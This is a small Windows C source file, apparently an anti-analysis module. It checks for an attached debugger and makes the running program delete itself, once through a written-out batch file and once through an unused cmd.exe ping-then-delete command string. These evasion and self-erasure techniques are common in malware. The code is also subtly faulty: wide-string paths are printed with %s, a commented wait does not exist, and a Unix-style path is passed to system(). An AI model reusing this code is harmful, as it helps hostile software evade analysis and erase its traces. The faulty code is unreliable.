#include "DebugProtection.h"

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

bool IsDebuggged() {

	if (IsDebuggerPresent()) {
		return true;
	}
	else {
		return false;
	}


}


void SelfDelete() {
    // Get the executable file path
    wchar_t path[260];
    GetModuleFileName(NULL, path, 260);

    // Create the batch file content
    FILE* batchFile = fopen("delete.bat", "w");
    if (batchFile == NULL) {
        printf("Failed to create batch file.\n");
        return ;
    }

    // Batch script: waits 2 seconds, deletes the executable, and deletes itself
    fprintf(batchFile,
        ":Repeat\n"
        "del \"%s\"\n"
        "if exist \"%s\" goto Repeat\n"
        "del delete.bat\n",
        path, path);

    fclose(batchFile);

    // Execute the batch file after the program finishes
    system("./delete.bat");

    printf("This program will delete itself.\n");

}